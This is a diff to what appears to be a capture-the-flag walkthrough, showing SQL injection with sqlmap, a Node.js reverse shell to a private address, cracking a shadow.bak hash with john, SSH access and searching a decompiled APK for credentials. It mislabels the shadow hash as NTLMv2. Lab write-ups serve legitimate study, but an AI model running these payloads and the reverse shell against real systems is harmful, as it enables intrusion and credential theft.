@@ -159,28 +159,28 @@ admin' AND 1=1--
 back-end DBMS: SQLite
 Tables:- sqlite_sequence,users
 sqlmap -r req.txt --batch --risk=3 --level=5 --dbs -T users --dump
-
-==> [Credetials Extracted from sql Injection]
+{Extracted Database Credentials}:-
 svc-backup:xxxxxx
 admin:xxxxxxx
 
 ==> [Reverse shell]
-pwn.js:-
+{pwn.js}:-
 require('child_process').exec(
 'bash -c "bash -i >& /dev/tcp/192.168.x.x/9001 0>&1"'
 )
 
-==> [Credential Hunting on Web server]
-shadow.bak file found!
+==> [Credential Hunting on Web server and Cracking Hash]
+{shadow.bak} file found! NTLMV2-Hash
+john shadow.bak /usr/share/wordlists/rockyou.txt
 svc-drop:xxxxxxxxxxxx
 
 ==> [SSH Login]
 svc-drop:xxxxxxxxxxxx
 
-==> [APK Compilication]
-/home/svc-drop/backup/deaddrop-mobile.apk  --> Compile it using {jadx-gui}
+==> [APK Compilation]
+/home/svc-drop/backup/deaddrop-mobile.apk  --> Compile it using {jadx-gui  Application}
 
-{Global search} :- Control+shift+F ==> Type (username,password)
+{Global search} :- Control + shift + F ==> Type (username,password)
 Found Creds j.harris:xxxxxxxxxxxxx2026!
 ```
 
